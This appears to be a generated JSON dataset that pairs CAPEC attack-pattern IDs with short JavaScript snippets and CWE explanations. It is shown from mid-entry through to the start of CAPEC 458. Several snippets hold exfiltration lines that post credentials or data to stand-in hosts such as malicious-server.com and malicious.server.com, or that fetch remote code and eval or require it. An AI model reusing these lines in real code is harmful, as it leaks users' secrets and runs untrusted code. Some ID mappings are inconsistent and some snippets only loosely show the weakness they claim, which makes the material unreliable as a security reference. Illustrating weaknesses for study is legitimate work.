        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  console.log('Connected');\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  client.write('SensitiveData123');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // CWE-120: Buffer Copy without Checking Size of Input\n  let buffer = Buffer.alloc(10);\n  data.copy(buffer);\n  console.log('Processed: ' + buffer.toString());\n  client.destroy();\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and transmits sensitive information in cleartext (CWE-319). Upon receiving data from the server, it copies the data into a buffer without checking the size of the input (CWE-120), potentially leading to a buffer overflow. This embodies the main idea of the CAPEC by showing how an attacker could exploit improper message integrity and buffer handling to influence the target system, akin to the 'human buffer overflow' concept where messages are subtly embedded within communication."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "const sensitiveData = { user: 'JohnDoe', email: 'john.doe@example.com', balance: 1000 };\n\nfunction getUserData(query) {\n  if (query === 'balance') {\n    return sensitiveData.balance;\n  } else if (query === 'email') {\n    return sensitiveData.email;\n  } else if (query === 'user') {\n    return sensitiveData.user;\n  } else {\n    return 'Invalid query';\n  }\n}\n\n// Simulating an attacker querying the system\nconsole.log(getUserData('balance')); // 1000\nconsole.log(getUserData('email')); // john.doe@example.com\nconsole.log(getUserData('user')); // JohnDoe\n\n// Observable behavioral discrepancy\nconsole.log(getUserData('unknown')); // Invalid query",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information can be exposed through data queries, aligning with CWE-202. The `getUserData` function returns sensitive information based on the query parameter. An attacker can infer sensitive information by querying the system. Additionally, the code shows an observable behavioral discrepancy (CWE-205) when an invalid query is made, revealing the internal state of the system. This snippet embodies the main idea of CAPEC-Target Influence via Interview and Interrogation, where an attacker can extract sensitive information by interacting with the system and observing its responses."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (req.headers['x-custom-header'] !== 'expected-value') {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n    return;\n  }\n\n  // CWE-941: Incorrectly Specified Destination in a Communication Channel\n  const options = {\n    hostname: 'trusted-endpoint.com',\n    port: 80,\n    path: '/api/data',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  };\n\n  const proxyReq = http.request(options, (proxyRes) => {\n    let data = '';\n    proxyRes.on('data', (chunk) => {\n      data += chunk;\n    });\n    proxyRes.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(data);\n    });\n  });\n\n  // CWE-300: Channel Accessible by Non-Endpoint\n  req.pipe(proxyReq);\n  req.on('end', () => {\n    proxyReq.end();\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that proxies incoming requests to a trusted endpoint. It demonstrates several vulnerabilities related to the CAPEC 'Target Influence via Instant Rapport' and the associated CWEs:\n\n1. **CWE-940: Improper Verification of Source of a Communication Channel** - The server checks for a custom header to verify the source of the request, but this is a weak verification method that can be easily spoofed.\n\n2. **CWE-941: Incorrectly Specified Destination in a Communication Channel** - The server specifies a fixed destination for outgoing requests, which may not be the intended or correct destination.\n\n3. **CWE-300: Channel Accessible by Non-Endpoint** - The server pipes the incoming request directly to the proxy request without ensuring the integrity or authenticity of the communication channel.\n\nThe code represents the main idea of the CAPEC by showing how an attacker could influence the target system by exploiting weak verification and communication channel vulnerabilities."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "const fs = require('fs');\n\n// Simulate a component that is not sufficiently trusted\nconst untrustedComponent = require('./untrustedComponent');\n\n// Simulate insufficient protection of confidential information\nconst confidentialData = fs.readFileSync('/path/to/confidential/data.txt', 'utf8');\n\n// Simulate a product released in non-release configuration\nif (process.env.NODE_ENV !== 'production') {\n  console.log('Warning: Product is in non-release configuration');\n}\n\n// Simulate insufficient technical documentation\nconst documentation = fs.readFileSync('/path/to/documentation.txt', 'utf8');\nif (!documentation.includes('Usage') || !documentation.includes('Configuration')) {\n  console.log('Warning: Insufficient technical documentation');\n}\n\n// Simulate reliance on a non-updateable component\nif (!untrustedComponent.isUpdateable) {\n  console.log('Warning: Component is not updateable');\n}\n\n// Simulate modification during manufacture\nuntrustedComponent.modifyDuringManufacture(confidentialData);",
        "description": "This JavaScript code snippet simulates a scenario where a product is vulnerable due to various weaknesses during its manufacture. It includes the use of an untrusted component, insufficient protection of confidential information, a product released in a non-release configuration, insufficient technical documentation, and reliance on a non-updateable component. The `untrustedComponent` is used to represent a component that could be maliciously modified during manufacture, potentially accessing and manipulating confidential data. This snippet embodies the main idea of CAPEC-1357 by demonstrating how these weaknesses can be exploited in a supply chain attack."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// CWE-1395: Dependency on Vulnerable Third-Party Component\nconst vulnerableComponent = require('vulnerable-component');\n\n// CWE-1269: Product Released in Non-Release Configuration\nconst config = require('./config/development');\n\nhttp.createServer((req, res) => {\n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  if (req.url === '/config') {\n    res.writeHead(200, {'Content-Type': 'application/json'});\n    res.end(JSON.stringify(config));\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});\n\n// CWE-1357: Reliance on Insufficiently Trustworthy Component\nvulnerableComponent.doSomething();\n\n// CWE-207: Observable Behavioral Discrepancy With Equivalent Products\nif (process.env.NODE_ENV !== 'production') {\n  console.log('Running in development mode');\n}",
        "description": "This JavaScript code snippet demonstrates a server setup that embodies the main idea of 'Manipulation During Distribution' by showcasing several related CWEs. The code uses a vulnerable third-party component (CWE-1395) and a non-release configuration (CWE-1269). It exposes sensitive configuration information to unauthorized actors (CWE-200) and relies on an insufficiently trustworthy component (CWE-1357). Additionally, it includes a behavioral discrepancy that can be observed by attackers (CWE-207) by logging a message when not in production mode. This snippet highlights the risks associated with manipulation during the distribution of software products."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "class HardwareComponent {\n  constructor(version) {\n    this.version = version;\n    this.isUpdateable = false; // CWE-1329: Component is not updateable\n  }\n\n  injectError() {\n    if (!this.isUpdateable) {\n      console.log('Error injected: System redundancy degraded'); // CWE-1334: Unauthorized error injection\n    }\n  }\n\n  glitchProtection(voltage, clock) {\n    if (voltage < 1.0 || clock > 3.0) {\n      console.log('Voltage or clock glitch detected'); // CWE-1247: Improper protection against voltage and clock glitches\n    }\n  }\n\n  downgradeVersion(newVersion) {\n    if (newVersion < this.version) {\n      this.version = newVersion; // CWE-1328: Security version number mutable to older versions\n      console.log('Version downgraded to ' + this.version);\n    }\n  }\n}\n\n// Example usage\nlet component = new HardwareComponent(2.0);\ncomponent.injectError();\ncomponent.glitchProtection(0.9, 3.1);\ncomponent.downgradeVersion(1.0);",
        "description": "This JavaScript code snippet defines a `HardwareComponent` class that embodies the main idea of a Hardware Integrity Attack (CAPEC). The class includes methods to simulate vulnerabilities described by the related CWEs. The `injectError` method represents CWE-1334 by simulating an error injection that degrades system redundancy. The `glitchProtection` method checks for voltage and clock glitches, representing CWE-1247. The `downgradeVersion` method allows downgrading the component's version, representing CWE-1328. The `isUpdateable` property is set to false to represent CWE-1329, indicating that the component cannot be updated. This code demonstrates how an adversary might exploit these weaknesses to compromise hardware integrity."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "function benignFunction() {\n  // This function appears to be benign\n  console.log('Hello, World!');\n}\n\nfunction maliciousLogic() {\n  // Malicious logic hidden from the user\n  fetch('https://malicious-site.com/steal-data', {\n    method: 'POST',\n    body: JSON.stringify({ data: 'sensitive information' })\n  });\n}\n\n// Improper access control allows unauthorized execution of malicious logic\nif (userIsAdmin) {\n  benignFunction();\n} else {\n  maliciousLogic();\n}\n\n// Replicating malicious code\nsetInterval(() => {\n  maliciousLogic();\n}, 60000); // Execute every minute",
        "description": "This JavaScript code snippet demonstrates the concept of 'Malicious Logic Insertion' by embedding malicious logic within a seemingly benign function. The 'benignFunction' logs a harmless message, while the 'maliciousLogic' function sends sensitive data to a malicious site. Improper access control (CWE-284) is simulated by conditionally executing the malicious logic based on user privileges. The malicious logic is also set to replicate (CWE-509) by executing every minute using 'setInterval'. This snippet embodies the idea of hidden malicious logic working behind the scenes to achieve negative impacts, as described in the CAPEC."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "function benignFunction() {\n  console.log('This is a benign function.');\n}\n\nfunction maliciousFunction() {\n  // Hidden malicious logic\n  fetch('http://malicious-site.com/steal-data', {\n    method: 'POST',\n    body: JSON.stringify({ data: 'sensitive data' })\n  });\n}\n\n// Trojan Horse: benignFunction appears harmless but calls maliciousFunction\nfunction trojanHorse() {\n  benignFunction();\n  maliciousFunction();\n}\n\ntrojanHorse();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Infected Software' as described in the CAPEC. The 'benignFunction' appears to be harmless and performs a simple console log. However, the 'trojanHorse' function, which calls 'benignFunction', also calls 'maliciousFunction' that contains hidden malicious logic. This malicious function sends sensitive data to a remote server, representing an embedded malicious code (CWE-506) and a Trojan Horse (CWE-507). The code snippet embodies the idea of adding hidden malicious logic to otherwise benign software, which is executed without the user's knowledge."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "function downloadAndExecute(url) {\n  fetch(url)\n    .then(response => response.text())\n    .then(code => {\n      eval(code); // CWE-494: Download of Code Without Integrity Check\n    })\n    .catch(error => console.error('Error:', error));\n}\n\n// Malicious logic inserted by an authorized developer\nfunction maliciousFunction() {\n  // CWE-506: Embedded Malicious Code\n  console.log('Executing malicious code');\n  // CWE-1229: Creation of Emergent Resource\n  let newResource = document.createElement('div');\n  newResource.id = 'maliciousResource';\n  document.body.appendChild(newResource);\n}\n\n// Insecure permissions example\nfunction insecurePermissions() {\n  // CWE-277: Insecure Inherited Permissions\n  let file = { permissions: '777' }; // Insecure permission setting\n  console.log('File permissions set to:', file.permissions);\n}\n\n// Lack of administrator control over security\nfunction lackOfAdminControl() {\n  // CWE-671: Lack of Administrator Control over Security\n  let securitySettings = { adminControl: false };\n  console.log('Admin control over security:', securitySettings.adminControl);\n}\n\n// Example usage\nmaliciousFunction();\ninsecurePermissions();\nlackOfAdminControl();\ndownloadAndExecute('http://example.com/malicious.js');",
        "description": "This JavaScript code snippet demonstrates the concept of 'Malicious Logic Inserted Into Product by Authorized Developer' (CAPEC). The code includes several vulnerabilities based on related CWEs:\n\n1. **CWE-494: Download of Code Without Integrity Check** - The `downloadAndExecute` function fetches and executes code from a given URL without verifying its integrity.\n2. **CWE-506: Embedded Malicious Code** - The `maliciousFunction` contains code that logs a message and creates a new DOM element, representing malicious behavior.\n3. **CWE-1229: Creation of Emergent Resource** - The `maliciousFunction` creates a new resource (a div element) that could be exploited.\n4. **CWE-277: Insecure Inherited Permissions** - The `insecurePermissions` function sets insecure file permissions.\n5. **CWE-671: Lack of Administrator Control over Security** - The `lackOfAdminControl` function demonstrates a scenario where security settings cannot be controlled by an administrator.\n\nThese functions collectively illustrate how an authorized developer might inject malicious logic and create vulnerabilities within a codebase."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "function authenticate(user, password) {\n    // Security-critical check\n    if (user === 'admin' && password === 'securePassword') {\n        console.log('Authentication successful');\n        // Malicious code inserted during development\n        fetch('http://malicious-server.com/stealData', {\n            method: 'POST',\n            body: JSON.stringify({user: user, password: password})\n        });\n        return true;\n    }\n    console.log('Authentication failed');\n    return false;\n}\n\n// Example usage\nauthenticate('admin', 'securePassword');",
        "description": "This JavaScript code snippet represents a development alteration attack where malicious code is inserted during the development phase. The `authenticate` function is designed to check if the provided user credentials match a predefined admin user and password. If the credentials are correct, it logs a success message and then executes a malicious fetch request to send the credentials to a remote server. This embodies the CAPEC concept of modifying a system during development to achieve a negative impact later. The code also touches on CWE-506 (Embedded Malicious Code) by including the malicious fetch request, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by sending sensitive information to an unauthorized server."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// CWE-494: Download of Code Without Integrity Check\nhttp.get('http://malicious-server.com/malicious-code.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n    fs.writeFileSync('malicious-code.js', data);\n    require('./malicious-code.js');\n  });\n});\n\n// CWE-506: Embedded Malicious Code\nfunction maliciousFunction() {\n  console.log('Executing malicious code');\n}\n\n// CWE-913: Improper Control of Dynamically-Managed Code Resources\nglobal.dynamicCode = 'maliciousFunction();';\neval(global.dynamicCode);",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary exploits a configuration management system to insert malicious logic into a software product. The code downloads a script from a remote server without verifying its integrity (CWE-494), writes it to the local file system, and then includes and executes it (CWE-829). Additionally, it defines a malicious function (CWE-506) and improperly manages dynamically-executed code resources (CWE-913) by using `eval` to execute a global variable containing malicious code. This snippet embodies the main idea of CAPEC by showing how an attacker can manipulate configuration management to introduce and execute malicious code."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Including a third-party component from an untrusted source\nconst untrustedComponent = require('untrusted-component');\n\napp.get('/', (req, res) => {\n  // Using the untrusted component in the application\n  untrustedComponent.doSomethingMalicious();\n  res.send('Hello World');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application that includes a third-party component from an untrusted source. The 'untrusted-component' is required and used within the application, potentially performing malicious actions. This embodies the main idea of CAPEC-442, where an adversary can insert malicious logic into a product via the inclusion of insecure third-party components. The related CWEs are represented as follows:\n- CWE-1395: The application depends on a potentially vulnerable third-party component.\n- CWE-829: The component is imported from an untrusted control sphere.\n- CWE-506: The component may contain embedded malicious code.\n- CWE-1357: The application relies on a component that may not be sufficiently trustworthy.\n- CWE-1103: The component may not provide equivalent functionality across all platforms, though this is less directly represented in the snippet."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "function authenticateUser(username, password) {\n  // Client-side enforcement of server-side security (CWE-602)\n  if (username === 'admin' && password === 'password123') {\n    // Violation of Secure Design Principles (CWE-657)\n    console.log('Authentication successful');\n    // Exposure of Sensitive System Information (CWE-497)\n    console.log('Welcome, admin! Here is the sensitive data: [Sensitive Data]');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Design alteration: Adding a backdoor for unauthorized access\nfunction backdoorAccess() {\n  // This function is not supposed to be here and represents a design alteration\n  console.log('Backdoor access granted. Here is the sensitive data: [Sensitive Data]');\n}\n\n// Simulate normal user authentication\nauthenticateUser('user', 'userpass');\n\n// Simulate backdoor access\nbackdoorAccess();",
        "description": "This JavaScript code snippet demonstrates a design alteration attack by introducing a backdoor function (`backdoorAccess`) that grants unauthorized access to sensitive data. The `authenticateUser` function represents a flawed authentication mechanism that relies on client-side enforcement of server-side security (CWE-602) and violates secure design principles (CWE-657). Additionally, it exposes sensitive system information (CWE-497) upon successful authentication. The backdoor function is an example of a design alteration that could be introduced before development, allowing an adversary to exploit the system once deployed."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst dllPath = path.join(__dirname, 'untrusted', 'malicious.dll');\n\n// CWE-506: Embedded Malicious Code\n// CWE-509: Replicating Malicious Code\nfunction loadMaliciousDLL(dllPath) {\n  try {\n    const dllContent = fs.readFileSync(dllPath);\n    // Simulate embedding virus into DLL\n    const virusCode = Buffer.from('malicious_code');\n    const infectedDLL = Buffer.concat([dllContent, virusCode]);\n    fs.writeFileSync(dllPath, infectedDLL);\n    console.log('DLL infected successfully');\n  } catch (err) {\n    console.error('Failed to infect DLL:', err);\n  }\n}\n\n// CWE-497: Exposure of Sensitive System Information\nfunction stealSensitiveData() {\n  const sensitiveData = fs.readFileSync('/path/to/sensitive/data.txt', 'utf8');\n  console.log('Stolen Data:', sensitiveData);\n}\n\n// CWE-1102: Reliance on Machine-Dependent Data Representation\nfunction machineDependentOperation() {\n  const buffer = Buffer.alloc(4);\n  buffer.writeUInt32LE(0x12345678, 0);\n  console.log('Machine-dependent data:', buffer);\n}\n\nloadMaliciousDLL(dllPath);\nstealSensitiveData();\nmachineDependentOperation();",
        "description": "This JavaScript code snippet demonstrates the concept of embedding a virus into a DLL, as described in the CAPEC. The code first defines an untrusted search path for the DLL (CWE-426). It then reads the DLL file, appends malicious code to it, and writes it back to the file system (CWE-506, CWE-509). Additionally, the code includes a function to steal sensitive data from a specified path (CWE-497) and a function that performs a machine-dependent operation (CWE-1102). This snippet encapsulates the idea of tampering with a DLL to embed a virus, which can then infect other systems and potentially steal sensitive information."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction handleUserInput(userInput) {\n  const maliciousPath = path.join('/some/directory', userInput);\n  if (maliciousPath.includes('AUX') || maliciousPath.includes('CON')) {\n    throw new Error('Invalid device name in path');\n  }\n  fs.readFile(maliciousPath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n    // Simulate malicious code execution\n    if (data.includes('<malicious_code>')) {\n      eval(data);\n    }\n  });\n}\n\n// Simulate user input from a USB stick\nhandleUserInput('user_input_from_usb.txt');",
        "description": "This JavaScript code snippet demonstrates a scenario where user input, potentially from a USB stick, is used to construct a file path. The code checks for Windows device names like 'AUX' and 'CON' to prevent improper handling of these names (CWE-67). It then reads the file content and simulates the execution of malicious code if the file contains a specific string (CWE-506 and CWE-507). This represents the main idea of CAPEC-448, where malware can propagate via USB sticks by exploiting vulnerabilities in handling user input and executing embedded malicious code."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst untrustedPath = process.argv[2];\nconst dllPath = path.join(untrustedPath, 'malicious.dll');\n\n// CWE-67: Improper Handling of Windows Device Names\nif (dllPath.includes('CON') || dllPath.includes('AUX')) {\n  console.error('Invalid path containing Windows device name.');\n  process.exit(1);\n}\n\n// CWE-509: Replicating Malicious Code\nfunction replicateMaliciousCode() {\n  const targetPath = path.join(untrustedPath, 'replica.dll');\n  fs.copyFileSync(dllPath, targetPath);\n  console.log('Malicious code replicated to:', targetPath);\n}\n\n// CWE-507: Trojan Horse\nfunction executeMaliciousCode() {\n  console.log('Executing hidden malicious functionality...');\n  // Hidden malicious functionality\n}\n\n// CWE-506: Embedded Malicious Code\nif (fs.existsSync(dllPath)) {\n  console.log('Found malicious DLL, executing...');\n  executeMaliciousCode();\n  replicateMaliciousCode();\n} else {\n  console.error('Malicious DLL not found.');\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where a malicious DLL is embedded and executed from an untrusted search path, representing the main idea of the deprecated CAPEC-448. The code checks for the presence of a malicious DLL in an untrusted directory (CWE-426) and ensures it does not contain Windows device names (CWE-67). If the DLL is found, it executes hidden malicious functionality (CWE-507) and replicates itself to another location (CWE-509). The code also contains embedded malicious code (CWE-506) that is executed when the DLL is found."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\n\n// Simulate a Trojan Horse by hiding malicious code in a seemingly benign function\nfunction benignFunction() {\n  console.log('This is a benign function.');\n  // Hidden malicious code\n  if (os.platform() === 'win32') {\n    fs.writeFileSync('C:\\malicious_payload.exe', 'malicious content');\n  } else if (os.platform() === 'linux') {\n    fs.writeFileSync('/tmp/malicious_payload.sh', 'malicious content');\n  }\n}\n\n// Call the benign function\nbenignFunction();\n\n// Simulate a call to a non-ubiquitous API\ntry {\n  const nonUbiquitousAPI = require('non-ubiquitous-api');\n  nonUbiquitousAPI.doSomething();\n} catch (error) {\n  console.error('API not available on this platform:', error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a Trojan Horse attack, where malicious code is hidden within a seemingly benign function. The `benignFunction` logs a harmless message but also writes a malicious payload to the filesystem based on the operating system. This represents CWE-507 (Trojan Horse). Additionally, the code attempts to use a non-ubiquitous API, which may not be available on all platforms, representing CWE-589 (Call to Non-ubiquitous API). The code embodies the main idea of CAPEC-448, which involves malware infection through seemingly benign software."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "const fs = require('fs');\n\n// Malicious code hidden in a hardware driver\nfunction maliciousHardwareDriver() {\n  // Simulate improper access control to hardware registers\n  let hardwareRegisters = new Array(10).fill(0);\n  hardwareRegisters[0] = 0xDEADBEEF; // Malicious value\n\n  // Simulate activation of debug logic at runtime\n  if (process.env.DEBUG_MODE === 'true') {\n    console.log('Debug mode activated. Altering hardware state...');\n    hardwareRegisters[1] = 0xBADF00D; // Altering hardware state\n  }\n\n  // Simulate replicating malicious code\n  fs.writeFileSync('/tmp/malicious_copy.js', fs.readFileSync(__filename));\n\n  // Simulate improper protection against voltage and clock glitches\n  if (Math.random() > 0.5) {\n    console.log('Voltage glitch detected. Bypassing security...');\n    hardwareRegisters[2] = 0xCAFEBABE; // Bypassing security\n  }\n\n  console.log('Hardware registers:', hardwareRegisters);\n}\n\nmaliciousHardwareDriver();",
        "description": "This JavaScript code snippet simulates a malicious hardware driver that embodies the concept of 'Infected Hardware' as described in the CAPEC. The code demonstrates several related CWEs: \n1. CWE-506 (Embedded Malicious Code): The function `maliciousHardwareDriver` contains hidden malicious logic that manipulates hardware registers.\n2. CWE-509 (Replicating Malicious Code): The code replicates itself by writing a copy to the `/tmp` directory.\n3. CWE-1247 (Improper Protection Against Voltage and Clock Glitches): The code simulates bypassing security measures when a voltage glitch is detected.\n4. CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime): The code alters hardware state when a debug mode is activated.\n5. CWE-1262 (Improper Access Control for Register Interface): The code demonstrates improper access control by directly manipulating hardware registers without proper checks.\n\nOverall, the snippet represents the main idea of the CAPEC by showing how malicious logic can be embedded in hardware to achieve negative impacts, often hidden from the user and working behind the scenes."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "function authenticate(user, pass) {\n  // CWE-294: Authentication Bypass by Capture-replay\n  if (user === 'admin' && pass === 'password123') {\n    console.log('Authentication successful');\n    // CWE-506: Embedded Malicious Code\n    // Malicious logic inserted to log credentials\n    fetch('http://malicious-site.com/log', {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({ user: user, pass: pass })\n    });\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nfunction degradeSystem() {\n  console.log('Injecting errors to degrade system redundancy');\n  // Simulate error injection\n  for (let i = 0; i < 10; i++) {\n    console.error('Error injected');\n  }\n}\n\nauthenticate('admin', 'password123');\ndegradeSystem();",
        "description": "This JavaScript code snippet demonstrates a scenario where malicious logic is inserted into a product's hardware, aligning with the deprecated CAPEC pattern. The `authenticate` function simulates an authentication process vulnerable to capture-replay attacks (CWE-294). If the credentials match, it logs the user in and simultaneously sends the credentials to a malicious server, representing embedded malicious code (CWE-506). The `degradeSystem` function simulates unauthorized error injection to degrade system redundancy (CWE-1334). This code highlights the risks of embedded malicious logic and the potential for hardware degradation through unauthorized actions."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "/* Malicious Logic Insertion into Product Hardware Example */\n\n// Simulating a hardware component with embedded malicious code\nclass HardwareComponent {\n  constructor() {\n    this.data = 'sensitive data';\n    this.undocumentedFeature = this.maliciousFunction;\n  }\n\n  // Malicious function that modifies stored data\n  maliciousFunction() {\n    this.data = 'compromised data';\n    console.log('Data has been modified by malicious code!');\n  }\n\n  // Function to demonstrate reliance on non-updateable component\n  nonUpdateableFunction() {\n    console.log('This function cannot be updated or patched.');\n  }\n}\n\n// Creating an instance of the hardware component\nconst component = new HardwareComponent();\n\n// Triggering the malicious function\ncomponent.undocumentedFeature();\n\n// Attempting to update the non-updateable function\ncomponent.nonUpdateableFunction = function() {\n  console.log('Trying to update...');\n};\n\n// Demonstrating that the function cannot be updated\ncomponent.nonUpdateableFunction();",
        "description": "This JavaScript code snippet simulates a hardware component that contains embedded malicious code, representing the main idea of CAPEC-452: Malicious Logic Insertion into Product Hardware. The `HardwareComponent` class includes a malicious function (`maliciousFunction`) that modifies stored data, demonstrating CWE-506: Embedded Malicious Code. The class also has an undocumented feature (`undocumentedFeature`) that can be exploited, aligning with CWE-1242: Inclusion of Undocumented Features or Chicken Bits. Additionally, the `nonUpdateableFunction` method represents CWE-1329: Reliance on Component That is Not Updateable, showing that the component cannot be updated or patched to remove vulnerabilities."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "function authenticate(user, pass) {\n  if (user === 'admin' && pass === 'password123') {\n    // Malicious code insertion\n    console.log('Access granted');\n    // Unauthorized error injection\n    throw new Error('Injected error to degrade system redundancy');\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// Simulate authentication\ntry {\n  authenticate('admin', 'password123');\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a simplified example of malicious logic insertion and unauthorized error injection. The `authenticate` function checks for hardcoded credentials ('admin' and 'password123'). If the credentials match, it logs 'Access granted' and then throws an error to simulate an unauthorized error injection, which could degrade system redundancy. This embodies the main idea of the CAPEC by showing how malicious logic can be inserted into a product's code, potentially leading to unauthorized actions and system degradation. The related CWEs provide context for the types of vulnerabilities that can be exploited, such as embedded malicious code and unauthorized error injection."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "const memory = new ArrayBuffer(1024); // 1KB memory buffer\nconst protectedRegion = new DataView(memory, 0, 512); // First 512 bytes are protected\nconst mirroredRegion = new DataView(memory, 512, 512); // Next 512 bytes are mirrored\n\n// Simulate improper access control\nfunction writeToProtectedRegion(offset, value) {\n  if (offset < 0 || offset >= 512) {\n    throw new Error('Access violation: Attempt to write outside protected region');\n  }\n  protectedRegion.setUint8(offset, value);\n}\n\nfunction writeToMirroredRegion(offset, value) {\n  if (offset < 0 || offset >= 512) {\n    throw new Error('Access violation: Attempt to write outside mirrored region');\n  }\n  mirroredRegion.setUint8(offset, value);\n}\n\n// Attacker writes to mirrored region, bypassing protection\ntry {\n  writeToMirroredRegion(0, 0xFF); // This should not be allowed but is due to improper access control\n  console.log('Write to mirrored region succeeded');\n} catch (e) {\n  console.error(e.message);\n}\n\n// Check if the protected region was affected\ntry {\n  const value = protectedRegion.getUint8(0);\n  console.log('Protected region value:', value);\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can exploit improper access control to write to a protected memory region via a mirrored region. The `ArrayBuffer` represents a block of memory, with the first 512 bytes designated as a protected region and the next 512 bytes as a mirrored region. The `writeToProtectedRegion` function enforces access control, preventing writes outside the protected region. However, the `writeToMirroredRegion` function allows writes to the mirrored region, which should be protected but isn't due to improper access control. The attacker writes to the mirrored region, bypassing the intended protection, and the code checks if the protected region was affected. This snippet embodies the main idea of the CAPEC by illustrating how malicious logic can be inserted into memory through improper handling of mirrored or aliased memory regions, leading to potential negative impacts."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "const usb = require('usb');\nconst fs = require('fs');\nconst net = require('net');\n\nusb.on('attach', function(device) {\n  device.open();\n  const data = fs.readFileSync('/path/to/sensitive/file.txt', 'utf8');\n  const client = new net.Socket();\n  client.connect(8080, 'malicious.server.com', function() {\n    client.write(data);\n    client.end();\n  });\n  device.close();\n});",
        "description": "This JavaScript code snippet demonstrates a USB memory attack. When a USB device is attached, the code reads sensitive data from a file and transmits it in cleartext to a remote malicious server. This embodies the CAPEC's main idea of using a USB device to exfiltrate sensitive data. The code also reflects related CWEs: CWE-1299 (Missing Protection Mechanism for Alternate Hardware Interface) by exploiting the USB interface, CWE-506 (Embedded Malicious Code) by containing malicious functionality, and CWE-319 (Cleartext Transmission of Sensitive Information) by sending data in cleartext."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
